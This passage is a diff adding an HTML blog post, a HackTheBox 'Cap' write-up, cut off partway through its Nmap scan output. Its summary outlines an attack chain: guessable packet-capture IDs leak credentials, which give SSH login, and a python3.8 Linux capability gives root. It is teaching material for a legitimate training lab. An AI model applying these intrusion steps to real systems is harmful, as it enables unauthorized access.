@@ -1,0 +1,499 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <title>
+  HTB: Cap Writeup · mattjohnson.cloud
+</title>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="color-scheme" content="light dark">
+
+
+
+
+<meta name="author" content="matt johnson">
+<meta name="description" content="Here&#39;s how to solve HackTheBox&#39;s Cap.">
+<meta name="keywords" content="blog,cloud,personal,security,windows,chess">
+
+
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="HTB: Cap Writeup">
+  <meta name="twitter:description" content="Here&#39;s how to solve HackTheBox&#39;s Cap.">
+
+<meta property="og:url" content="http://www.mattjohnson.de/posts/htb-cap/">
+  <meta property="og:site_name" content="mattjohnson.cloud">
+  <meta property="og:title" content="HTB: Cap Writeup">
+  <meta property="og:description" content="Here&#39;s how to solve HackTheBox&#39;s Cap.">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2021-10-10T00:00:00+00:00">
+    <meta property="article:modified_time" content="2021-10-10T00:00:00+00:00">
+    <meta property="article:tag" content="Hackthebox">
+    <meta property="article:tag" content="Security">
+
+
+
+
+<link rel="canonical" href="http://www.mattjohnson.de/posts/htb-cap/">
+
+
+<link rel="preload" href="/fonts/fa-brands-400.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/fonts/fa-regular-400.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/fonts/fa-solid-900.woff2" as="font" type="font/woff2" crossorigin>
+
+
+  
+  
+  <link rel="stylesheet" href="/css/coder.min.7763f8bc6341ecf82378e867c285e1549abb063a899be313ccd25dbfcd24fa7d.css" integrity="sha256-d2P4vGNB7PgjeOhnwoXhVJq7BjqJm&#43;MTzNJdv80k&#43;n0=" crossorigin="anonymous" media="screen" />
+
+
+
+
+
+
+  
+    
+    
+    <link rel="stylesheet" href="/css/coder-dark.min.a00e6364bacbc8266ad1cc81230774a1397198f8cfb7bcba29b7d6fcb54ce57f.css" integrity="sha256-oA5jZLrLyCZq0cyBIwd0oTlxmPjPt7y6KbfW/LVM5X8=" crossorigin="anonymous" media="screen" />
+  
+
+
+
+ 
+
+
+
+
+<link rel="icon" type="image/svg+xml" href="/images/favicon.svg" sizes="any">
+<link rel="icon" type="image/png" href="/images/favicon-32x32.png" sizes="32x32">
+<link rel="icon" type="image/png" href="/images/favicon-16x16.png" sizes="16x16">
+
+<link rel="apple-touch-icon" href="/images/apple-touch-icon.png">
+<link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+<link rel="manifest" href="/site.webmanifest">
+<link rel="mask-icon" href="/images/safari-pinned-tab.svg" color="#5bbad5">
+
+
+
+
+
+
+
+
+
+</head>
+
+
+
+
+
+
+<body class="preload-transitions colorscheme-auto">
+  
+<div class="float-container">
+    <a id="dark-mode-toggle" class="colorscheme-toggle">
+        <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+    </a>
+</div>
+
+
+  <main class="wrapper">
+    <nav class="navigation">
+  <section class="container">
+    
+    <a class="navigation-title" href="http://www.mattjohnson.de/">
+      mattjohnson.cloud
+    </a>
+    
+    
+      <input type="checkbox" id="menu-toggle" />
+      <label class="menu-button float-right" for="menu-toggle">
+        <i class="fa-solid fa-bars fa-fw" aria-hidden="true"></i>
+      </label>
+      <ul class="navigation-list">
+        
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/about/">about</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/posts/">blog</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/tags/">tags</a>
+            </li>
+          
+        
+        
+      </ul>
+    
+  </section>
+</nav>
+
+
+    <div class="content">
+      
+  <section class="container post">
+    <article>
+      <header>
+        <div class="post-title">
+          <h1 class="title">
+            <a class="title-link" href="http://www.mattjohnson.de/posts/htb-cap/">
+              HTB: Cap Writeup
+            </a>
+          </h1>
+        </div>
+        <div class="post-meta">
+          <div class="date">
+            <span class="posted-on">
+              <i class="fa-solid fa-calendar" aria-hidden="true"></i>
+              <time datetime="2021-10-10T00:00:00Z">
+                October 10, 2021
+              </time>
+            </span>
+            <span class="reading-time">
+              <i class="fa-solid fa-clock" aria-hidden="true"></i>
+              6-minute read
+            </span>
+          </div>
+          <div class="authors">
+  <i class="fa-solid fa-user" aria-hidden="true"></i>
+    <a href="/authors/matt-johnson/">Matt Johnson</a></div>
+
+          
+          <div class="tags">
+  <i class="fa-solid fa-tag" aria-hidden="true"></i>
+    <span class="tag">
+      <a href="/tags/hackthebox/">Hackthebox</a>
+    </span>
+      <span class="separator">•</span>
+    <span class="tag">
+      <a href="/tags/security/">Security</a>
+    </span></div>
+
+        </div>
+      </header>
+
+      <div class="post-content">
+        
+        <div class="custom-toc">
+    <nav id="TableOfContents">
+  <ol>
+    <li><a href="#high-level-information">High-Level Information</a></li>
+    <li><a href="#initial-foothold">Initial Foothold</a></li>
+    <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+  </ol>
+</nav>
+</div>
+<h1 id="high-level-information">
+  High-Level Information
+  <a class="heading-link" href="#high-level-information">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h1>
+<p>Machine Name: Cap</p>
+<p>IP Address: 10.10.10.245</p>
+<p>Difficulty: Easy</p>
+<p>Summary: HackTheBox&rsquo;s Cap was retired last week, and was perhaps among the easiest of all of the machines that I&rsquo;ve completed. It is an excellent box for absolute beginners as the exploitation steps are simple both to understand and to execute. Initial enumeration via <code>Nmap</code> reveals a web application that serves as a security dashboard. Within the web application, the user can view a variety of processes and networking configurations. One of the pages, located within the <code>/data/</code> directory, allows the user to view a 5-second packet capture. As the IDs are linear and predictable, the attacker can manually modify the parameters of the request to view past packet captures, one of which includes credentials. Using those credentials to log in via <code>ssh</code> as <code>nathan</code>, automated enumeration scripts are utilized to identify a special Linux capability for the <code>python3.8</code> binary. Using that special capability, the unprivileged user is able to execute code as <code>root</code> and compromise the system.</p>
+<p>Tools Used: Nmap, strings, linPEAS</p>
+<h1 id="initial-foothold">
+  Initial Foothold
+  <a class="heading-link" href="#initial-foothold">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h1>
+<p>As is customary, I began enumerating the machine using Nmap:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-markdown" data-lang="markdown"><span style="display:flex;"><span><span style="color:#79c0ff;font-weight:bold"># Nmap 7.91 scan initiated Tue Jul 20 09:08:40 2021 as: nmap -sC -sV -p- -oA nmap/nmap 10.10.10.245
+</span></span></span><span style="display:flex;"><span><span style="color:#79c0ff;font-weight:bold"></span>Nmap scan report for 10.10.10.245
+</span></span><span style="display:flex;"><span>Host is up (0.042s latency).
+</span></span><span style="display:flex;"><span>Not shown: 65532 closed ports
+</span></span><span style="display:flex;"><span>PORT   STATE SERVICE VERSION
+</span></span><span style="display:flex;"><span>21/tcp open  ftp     vsftpd 3.0.3
+</span></span><span style="display:flex;"><span>22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
+</span></span><span style="display:flex;"><span>| ssh-hostkey: 
+</span></span><span style="display:flex;"><span>|   3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)
+</span></span><span style="display:flex;"><span>|   256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)
+</span></span><span style="display:flex;"><span>|_  256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)
+</span></span><span style="display:flex;"><span>80/tcp open  http    gunicorn
+</span></span><span style="display:flex;"><span>| fingerprint-strings: 
+</span></span><span style="display:flex;"><span>|   FourOhFourRequest: 
+</span></span><span style="display:flex;"><span>|     HTTP/1.0 404 NOT FOUND
+</span></span><span style="display:flex;"><span>|     Server: gunicorn
+</span></span><span style="display:flex;"><span>|     Date: Tue, 20 Jul 2021 13:13:50 GMT
+</span></span><span style="display:flex;"><span>|     Connection: close
+</span></span><span style="display:flex;"><span>|     Content-Type: text/html; charset=utf-8
+</span></span><span style="display:flex;"><span>|     Content-Length: 232
+</span></span><span style="display:flex;"><span>|     <span style="color:#8b949e;font-weight:bold;font-style:italic">&lt;!DOCTYPE HTML PUBLIC &#34;-//W3C//DTD HTML 3.2 Final//EN&#34;&gt;</span>
+</span></span><span style="display:flex;"><span>|     &lt;<span style="color:#7ee787">title</span>&gt;404 Not Found&lt;/<span style="color:#7ee787">title</span>&gt;
+</span></span><span style="display:flex;"><span>|     &lt;<span style="color:#7ee787">h1</span>&gt;Not Found&lt;/<span style="color:#7ee787">h1</span>&gt;
+</span></span><span style="display:flex;"><span>|     &lt;<span style="color:#7ee787">p</span>&gt;The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.&lt;/<span style="color:#7ee787">p</span>&gt;
+</span></span><span style="display:flex;"><span>|   GetRequest: 
+</span></span><span style="display:flex;"><span>|     HTTP/1.0 200 OK
+</span></span><span style="display:flex;"><span>|     Server: gunicorn
+</span></span><span style="display:flex;"><span>|     Date: Tue, 20 Jul 2021 13:13:45 GMT
+</span></span><span style="display:flex;"><span>|     Connection: close
+</span></span><span style="display:flex;"><span>|     Content-Type: text/html; charset=utf-8
+</span></span><span style="display:flex;"><span>|     Content-Length: 19386
+</span></span><span style="display:flex;"><span>|     <span style="color:#8b949e;font-weight:bold;font-style:italic">&lt;!DOCTYPE html&gt;</span>
+</span></span><span style="display:flex;"><span>|     &lt;<span style="color:#7ee787">html</span> class<span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#a5d6ff">&#34;no-js&#34;</span> lang<span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#a5d6ff">&#34;en&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>|     &lt;<span style="color:#7ee787">head</span>&gt;
+</span></span><span style="display:flex;"><span>|     &lt;<span style="color:#7ee787">meta</span> charset<span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#a5d6ff">&#34;utf-8&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>|     &lt;<span style="color:#7ee787">meta</span> http-equiv<span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#a5d6ff">&#34;x-ua-compatible&#34;</span> content<span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#a5d6ff">&#34;ie=edge&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>|     &lt;<span style="color:#7ee787">title</span>&gt;Security Dashboard&lt;/<span style="color:#7ee787">title</span>&gt;
+</span></span><span style="display:flex;"><span>|     &lt;<span style="color:#7ee787">meta</span> name<span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#a5d6ff">&#34;viewport&#34;</span> content<span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#a5d6ff">&#34;width=device-width, initial-scale=1&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>|     &lt;<span style="color:#7ee787">link</span> rel<span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#a5d6ff">&#34;shortcut icon&#34;</span> type<span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#a5d6ff">&#34;image/png&#34;</span> href<span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#a5d6ff">&#34;/static/images/icon/favicon.ico&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>|     &lt;<span style="color:#7ee787">link</span> rel<span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#a5d6ff">&#34;stylesheet&#34;</span> href<span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#a5d6ff">&#34;/static/css/bootstrap.min.css&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>|     &lt;<span style="color:#7ee787">link</span> rel<span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#a5d6ff">&#34;stylesheet&#34;</span> href<span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#a5d6ff">&#34;/static/css/font-awesome.min.css&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>|     &lt;<span style="color:#7ee787">link</span> rel<span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#a5d6ff">&#34;stylesheet&#34;</span> href<span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#a5d6ff">&#34;/static/css/themify-icons.css&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>|     &lt;<span style="color:#7ee787">link</span> rel<span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#a5d6ff">&#34;stylesheet&#34;</span> href<span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#a5d6ff">&#34;/static/css/metisMenu.css&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>|     &lt;<span style="color:#7ee787">link</span> rel<span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#a5d6ff">&#34;stylesheet&#34;</span> href<span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#a5d6ff">&#34;/static/css/owl.carousel.min.css&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>|     &lt;<span style="color:#7ee787">link</span> rel<span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#a5d6ff">&#34;stylesheet&#34;</span> href<span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#a5d6ff">&#34;/static/css/slicknav.min.css&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>|     <span style="color:#8b949e;font-style:italic">&lt;!-- amchar
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">|   HTTPOptions: 
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">|     HTTP/1.0 200 OK
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">|     Server: gunicorn
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">|     Date: Tue, 20 Jul 2021 13:13:45 GMT
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">|     Connection: close
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">|     Content-Type: text/html; charset=utf-8
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">|     Allow: HEAD, GET, OPTIONS
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">|     Content-Length: 0
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">|   RTSPRequest: 
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">|     HTTP/1.1 400 Bad Request
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">|     Connection: close
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">|     Content-Type: text/html
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">|     Content-Length: 196
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">|     &lt;html&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">|     &lt;head&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">|     &lt;title&gt;Bad Request&lt;/title&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">|     &lt;/head&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">|     &lt;body&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">|     &lt;h1&gt;&lt;p&gt;Bad Request&lt;/p&gt;&lt;/h1&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">|     Invalid HTTP Version &#39;Invalid HTTP Version: &#39;RTSP/1.0&#39;&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">|     &lt;/body&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">|_    &lt;/html&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">|_http-server-header: gunicorn
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">|_http-title: Security Dashboard
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">SF-Port80-TCP:V=7.91%I=7%D=7/20%Time=60F6CAFE%P=x86_64-pc-linux-gnu%r(GetR
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">SF:equest,2FE5,&#34;HTTP/1</span>\.<span style="color:#8b949e;font-style:italic">0</span>\x<span style="color:#8b949e;font-style:italic">20200</span>\x<span style="color:#8b949e;font-style:italic">20OK</span>\r\n<span style="color:#8b949e;font-style:italic">Server:</span>\x<span style="color:#8b949e;font-style:italic">20gunicorn</span>\r\n<span style="color:#8b949e;font-style:italic">Date:</span>\x<span style="color:#8b949e;font-style:italic">20
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">SF:Tue,</span>\x<span style="color:#8b949e;font-style:italic">2020</span>\x<span style="color:#8b949e;font-style:italic">20Jul</span>\x<span style="color:#8b949e;font-style:italic">202021</span>\x<span style="color:#8b949e;font-style:italic">2013:13:45</span>\x<span style="color:#8b949e;font-style:italic">20GMT</span>\r\n<span style="color:#8b949e;font-style:italic">Connection:</span>\x<span style="color:#8b949e;font-style:italic">20close</span>\r<span style="color:#8b949e;font-style:italic">\
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">SF:nContent-Type:</span>\x<span style="color:#8b949e;font-style:italic">20text/html;</span>\x<span style="color:#8b949e;font-style:italic">20charset=utf-8</span>\r\n<span style="color:#8b949e;font-style:italic">Content-Length:</span>\x<span style="color:#8b949e;font-style:italic">20193
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">SF:86</span>\r\n\r\n<span style="color:#8b949e;font-style:italic">&lt;!DOCTYPE</span>\x<span style="color:#8b949e;font-style:italic">20html&gt;</span>\n<span style="color:#8b949e;font-style:italic">&lt;html</span>\x<span style="color:#8b949e;font-style:italic">20class=</span>\&#34;<span style="color:#8b949e;font-style:italic">no-js</span>\&#34;\x<span style="color:#8b949e;font-style:italic">20lang=</span>\&#34;<span style="color:#8b949e;font-style:italic">en</span>\&#34;<span style="color:#8b949e;font-style:italic">&gt;\
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">SF:n</span>\n<span style="color:#8b949e;font-style:italic">&lt;head&gt;</span>\n\x<span style="color:#8b949e;font-style:italic">20</span>\x<span style="color:#8b949e;font-style:italic">20</span>\x<span style="color:#8b949e;font-style:italic">20</span>\x<span style="color:#8b949e;font-style:italic">20&lt;meta</span>\x<span style="color:#8b949e;font-style:italic">20charset=</span>\&#34;<span style="color:#8b949e;font-style:italic">utf-8</span>\&#34;<span style="color:#8b949e;font-style:italic">&gt;</span>\n\x<span style="color:#8b949e;font-style:italic">20</span>\x<span style="color:#8b949e;font-style:italic">20</span>\x<span style="color:#8b949e;font-style:italic">20</span>\x<span style="color:#8b949e;font-style:italic">2
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">SF:0&lt;meta</span>\x<span style="color:#8b949e;font-style:italic">20http-equiv=</span>\&#34;<span style="color:#8b949e;font-style:italic">x-ua-compatible</span>\&#34;\x<span style="color:#8b949e;font-style:italic">20content=</span>\&#34;<span style="color:#8b949e;font-style:italic">ie=edge</span>\&#34;<span style="color:#8b949e;font-style:italic">&gt;</span>\n\x<span style="color:#8b949e;font-style:italic">20\
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">SF:x20</span>\x<span style="color:#8b949e;font-style:italic">20</span>\x<span style="color:#8b949e;font-style:italic">20&lt;title&gt;Security</span>\x<span style="color:#8b949e;font-style:italic">20Dashboard&lt;/title&gt;</span>\n\x<span style="color:#8b949e;font-style:italic">20</span>\x<span style="color:#8b949e;font-style:italic">20</span>\x<span style="color:#8b949e;font-style:italic">20</span>\x<span style="color:#8b949e;font-style:italic">20&lt;meta\
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">SF:x20name=</span>\&#34;<span style="color:#8b949e;font-style:italic">viewport</span>\&#34;\x<span style="color:#8b949e;font-style:italic">20content=</span>\&#34;<span style="color:#8b949e;font-style:italic">width=device-width,</span>\x<span style="color:#8b949e;font-style:italic">20initial-scale=
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">SF:1</span>\&#34;<span style="color:#8b949e;font-style:italic">&gt;</span>\n\x<span style="color:#8b949e;font-style:italic">20</span>\x<span style="color:#8b949e;font-style:italic">20</span>\x<span style="color:#8b949e;font-style:italic">20</span>\x<span style="color:#8b949e;font-style:italic">20&lt;link</span>\x<span style="color:#8b949e;font-style:italic">20rel=</span>\&#34;<span style="color:#8b949e;font-style:italic">shortcut</span>\x<span style="color:#8b949e;font-style:italic">20icon</span>\&#34;\x<span style="color:#8b949e;font-style:italic">20type=</span>\&#34;<span style="color:#8b949e;font-style:italic">image
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">SF:/png</span>\&#34;\x<span style="color:#8b949e;font-style:italic">20href=</span>\&#34;<span style="color:#8b949e;font-style:italic">/static/images/icon/favicon</span>\.<span style="color:#8b949e;font-style:italic">ico</span>\&#34;<span style="color:#8b949e;font-style:italic">&gt;</span>\n\x<span style="color:#8b949e;font-style:italic">20</span>\x<span style="color:#8b949e;font-style:italic">20</span>\x<span style="color:#8b949e;font-style:italic">20</span>\x<span style="color:#8b949e;font-style:italic">20&lt;
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">SF:link</span>\x<span style="color:#8b949e;font-style:italic">20rel=</span>\&#34;<span style="color:#8b949e;font-style:italic">stylesheet</span>\&#34;\x<span style="color:#8b949e;font-style:italic">20href=</span>\&#34;<span style="color:#8b949e;font-style:italic">/static/css/bootstrap</span>\.<span style="color:#8b949e;font-style:italic">min</span>\.<span style="color:#8b949e;font-style:italic">css</span>\&#34;<span style="color:#8b949e;font-style:italic">&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">SF:</span>\n\x<span style="color:#8b949e;font-style:italic">20</span>\x<span style="color:#8b949e;font-style:italic">20</span>\x<span style="color:#8b949e;font-style:italic">20</span>\x<span style="color:#8b949e;font-style:italic">20&lt;link</span>\x<span style="color:#8b949e;font-style:italic">20rel=</span>\&#34;<span style="color:#8b949e;font-style:italic">stylesheet</span>\&#34;\x<span style="color:#8b949e;font-style:italic">20href=</span>\&#34;<span style="color:#8b949e;font-style:italic">/static/css/fon
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">SF:t-awesome</span>\.<span style="color:#8b949e;font-style:italic">min</span>\.<span style="color:#8b949e;font-style:italic">css</span>\&#34;<span style="color:#8b949e;font-style:italic">&gt;</span>\n\x<span style="color:#8b949e;font-style:italic">20</span>\x<span style="color:#8b949e;font-style:italic">20</span>\x<span style="color:#8b949e;font-style:italic">20</span>\x<span style="color:#8b949e;font-style:italic">20&lt;link</span>\x<span style="color:#8b949e;font-style:italic">20rel=</span>\&#34;<span style="color:#8b949e;font-style:italic">stylesheet</span>\&#34;\x<span style="color:#8b949e;font-style:italic">20
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">SF:href=</span>\&#34;<span style="color:#8b949e;font-style:italic">/static/css/themify-icons</span>\.<span style="color:#8b949e;font-style:italic">css</span>\&#34;<span style="color:#8b949e;font-style:italic">&gt;</span>\n\x<span style="color:#8b949e;font-style:italic">20</span>\x<span style="color:#8b949e;font-style:italic">20</span>\x<span style="color:#8b949e;font-style:italic">20</span>\x<span style="color:#8b949e;font-style:italic">20&lt;link</span>\x<span style="color:#8b949e;font-style:italic">20rel=
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">SF:</span>\&#34;<span style="color:#8b949e;font-style:italic">stylesheet</span>\&#34;\x<span style="color:#8b949e;font-style:italic">20href=</span>\&#34;<span style="color:#8b949e;font-style:italic">/static/css/metisMenu</span>\.<span style="color:#8b949e;font-style:italic">css</span>\&#34;<span style="color:#8b949e;font-style:italic">&gt;</span>\n\x<span style="color:#8b949e;font-style:italic">20</span>\x<span style="color:#8b949e;font-style:italic">20</span>\x<span style="color:#8b949e;font-style:italic">20</span>\x<span style="color:#8b949e;font-style:italic">2
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">SF:0&lt;link</span>\x<span style="color:#8b949e;font-style:italic">20rel=</span>\&#34;<span style="color:#8b949e;font-style:italic">stylesheet</span>\&#34;\x<span style="color:#8b949e;font-style:italic">20href=</span>\&#34;<span style="color:#8b949e;font-style:italic">/static/css/owl</span>\.<span style="color:#8b949e;font-style:italic">carousel</span>\.<span style="color:#8b949e;font-style:italic">min</span>\.<span style="color:#8b949e;font-style:italic">
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">SF:css</span>\&#34;<span style="color:#8b949e;font-style:italic">&gt;</span>\n\x<span style="color:#8b949e;font-style:italic">20</span>\x<span style="color:#8b949e;font-style:italic">20</span>\x<span style="color:#8b949e;font-style:italic">20</span>\x<span style="color:#8b949e;font-style:italic">20&lt;link</span>\x<span style="color:#8b949e;font-style:italic">20rel=</span>\&#34;<span style="color:#8b949e;font-style:italic">stylesheet</span>\&#34;\x<span style="color:#8b949e;font-style:italic">20href=</span>\&#34;<span style="color:#8b949e;font-style:italic">/static/c
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">SF:ss/slicknav</span>\.<span style="color:#8b949e;font-style:italic">min</span>\.<span style="color:#8b949e;font-style:italic">css</span>\&#34;<span style="color:#8b949e;font-style:italic">&gt;</span>\n\x<span style="color:#8b949e;font-style:italic">20</span>\x<span style="color:#8b949e;font-style:italic">20</span>\x<span style="color:#8b949e;font-style:italic">20</span>\x<span style="color:#8b949e;font-style:italic">20&lt;!--</span>\x<span style="color:#8b949e;font-style:italic">20amchar&#34;)%r(HTTPOption
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">SF:s,B3,&#34;HTTP/1</span>\.<span style="color:#8b949e;font-style:italic">0</span>\x<span style="color:#8b949e;font-style:italic">20200</span>\x<span style="color:#8b949e;font-style:italic">20OK</span>\r\n<span style="color:#8b949e;font-style:italic">Server:</span>\x<span style="color:#8b949e;font-style:italic">20gunicorn</span>\r\n<span style="color:#8b949e;font-style:italic">Date:</span>\x<span style="color:#8b949e;font-style:italic">20Tue,</span>\x<span style="color:#8b949e;font-style:italic">2
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">SF:020</span>\x<span style="color:#8b949e;font-style:italic">20Jul</span>\x<span style="color:#8b949e;font-style:italic">202021</span>\x<span style="color:#8b949e;font-style:italic">2013:13:45</span>\x<span style="color:#8b949e;font-style:italic">20GMT</span>\r\n<span style="color:#8b949e;font-style:italic">Connection:</span>\x<span style="color:#8b949e;font-style:italic">20close</span>\r\n<span style="color:#8b949e;font-style:italic">Conten
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">SF:t-Type:</span>\x<span style="color:#8b949e;font-style:italic">20text/html;</span>\x<span style="color:#8b949e;font-style:italic">20charset=utf-8</span>\r\n<span style="color:#8b949e;font-style:italic">Allow:</span>\x<span style="color:#8b949e;font-style:italic">20HEAD,</span>\x<span style="color:#8b949e;font-style:italic">20GET,</span>\x<span style="color:#8b949e;font-style:italic">20OP
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">SF:TIONS</span>\r\n<span style="color:#8b949e;font-style:italic">Content-Length:</span>\x<span style="color:#8b949e;font-style:italic">200</span>\r\n\r\n<span style="color:#8b949e;font-style:italic">&#34;)%r(RTSPRequest,121,&#34;HTTP/1</span>\.<span style="color:#8b949e;font-style:italic">1</span>\x<span style="color:#8b949e;font-style:italic">2
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">SF:0400</span>\x<span style="color:#8b949e;font-style:italic">20Bad</span>\x<span style="color:#8b949e;font-style:italic">20Request</span>\r\n<span style="color:#8b949e;font-style:italic">Connection:</span>\x<span style="color:#8b949e;font-style:italic">20close</span>\r\n<span style="color:#8b949e;font-style:italic">Content-Type:</span>\x<span style="color:#8b949e;font-style:italic">20text
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">SF:/html</span>\r\n<span style="color:#8b949e;font-style:italic">Content-Length:</span>\x<span style="color:#8b949e;font-style:italic">20196</span>\r\n\r\n<span style="color:#8b949e;font-style:italic">&lt;html&gt;</span>\n\x<span style="color:#8b949e;font-style:italic">20</span>\x<span style="color:#8b949e;font-style:italic">20&lt;head&gt;</span>\n\x<span style="color:#8b949e;font-style:italic">20</span>\x<span style="color:#8b949e;font-style:italic">20
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">SF:</span>\x<span style="color:#8b949e;font-style:italic">20</span>\x<span style="color:#8b949e;font-style:italic">20&lt;title&gt;Bad</span>\x<span style="color:#8b949e;font-style:italic">20Request&lt;/title&gt;</span>\n\x<span style="color:#8b949e;font-style:italic">20</span>\x<span style="color:#8b949e;font-style:italic">20&lt;/head&gt;</span>\n\x<span style="color:#8b949e;font-style:italic">20</span>\x<span style="color:#8b949e;font-style:italic">20&lt;body&gt;\
